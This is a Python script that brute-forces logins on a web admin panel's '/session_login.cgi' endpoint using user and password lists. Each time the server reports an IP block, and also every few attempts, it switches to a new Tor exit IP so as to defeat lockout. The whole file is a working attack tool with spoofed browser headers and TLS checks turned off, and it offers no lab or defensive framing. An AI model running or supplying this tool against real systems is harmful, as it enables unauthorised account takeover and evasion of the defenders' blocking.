#!/usr/bin/python3
import os
import sys
import time
import json
import socks
import socket
import urllib3
import argparse
import requests
from stem import Signal
from stem.control import Controller
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=False, default=None, action='store', help='Target url')
	parser.add_argument('-tp', '--tor_password', required=False, default=None, action='store', help='Tor password')
	parser.add_argument('-u', '--user', required=False, default=None, action='store', help='User')
	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
	parser.add_argument('-UP', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
	parser.add_argument('-r', '--retries', required=False, default=3, action='store', help='Retries per IP address. Default: 3')
	return parser


def change_tor_ip(controller, debug):
	try:
		controller.signal(Signal.NEWNYM)
		time.sleep(controller.get_newnym_wait())
	except:
		print("[!] Error changing IP address using Tor")
		pass
	new_ip = requests.get('https://api.ipify.org').text.replace("\n","")
	return new_ip


def get_controller(tor_password):
	try:
		controller = Controller.from_port(port=9051)
		controller.authenticate(password=tor_password)
		socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
		socket.socket = socks.socksocket
		return controller
	except:
		pass


def check_creds(target,credential,debug,counter,pairs,controller,tor_password):
	user = credential[0]
	password = credential[1]
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language": "en-US,en;q=0.9",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer": target,
		"Origin": target,
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control": "max-age=0",
		"Cookie": "redirect=1; testing=1"
	}
	data = { "user":user,"pass":password }
	response = requests.post(target+"/session_login.cgi", data = data, headers = headers, verify = False, allow_redirects=True)
	if debug: print("[%s/%s] Response status code: %s" % (counter, pairs, response.status_code))
	if str(len(response.history)) != "0":
		print("[!!!] Correct credentials %s:%s" % (user, password))
		sys.exit(0)
	if "Access denied for" in response.text:
		print("[%s/%s] IP is blocked - Too many retries"%(counter, pairs))
		if (tor_password is not None):
			if debug: print("[%s/%s] Changing IP address"%(str(counter), str(pairs)))
			new_ip = change_tor_ip(controller, debug)
			if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(pairs), new_ip))
			check_creds(target, credential, debug, counter, pairs, controller, tor_password)



def main():
	# Get arguments
	args = get_args().parse_args()
	if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
		get_args().print_help()
		sys.exit(0)
	if (args.user_list is not None and not os.path.isfile(args.user_list)):
		print ("[!] Error: Use '-U' with a file of users or '-u' for a single user")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-P' with a file of passwords or '-p' for a single password")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-UP' with a file of usernames and passwords with the format username:password")
		sys.exit(0)

	# Create variables
	if args.userpassword_list is None:
		users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
		passwords =  [args.password] if args.password is not None else open(args.password_list).read().splitlines()
		pairs =      [(u,p) for u in users for p in passwords]
	else:
		creds =      list(filter(None,[c for c in open(args.userpassword_list).read().splitlines()]))
		users =      [c.split(":")[0] for c in creds]
		passwords =  [c.split(":")[1] for c in creds]
		pairs =      [(c.split(":")[0],c.split(":")[1]) for c in creds]

	tor_password = args.tor_password if args.tor_password is not None else None
	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
	target = args.target
	retries = int(args.retries)
	counter = 0
	correct_users_list = []
	controller = None

	if tor_password is not None:
		controller = get_controller(tor_password)
		new_ip = change_tor_ip(controller, debug)
	for credential in pairs:
		if credential[0] not in correct_users_list:
			counter += 1
			print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)), credential[0], credential[1]))
			try:
				check_creds(target, credential, debug, str(counter), str(len(pairs)), controller, tor_password)
				if (tor_password is not None) and (counter%retries == 0):
					if debug: print("[%s/%s] Changing IP address"%(str(counter), str(len(pairs))))
					new_ip = change_tor_ip(controller, debug)
					if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(len(pairs)), new_ip))
			except Exception as e:
				print(str(e))
				print("[!] Fallo IP")
				pass


if __name__== "__main__":
	main()
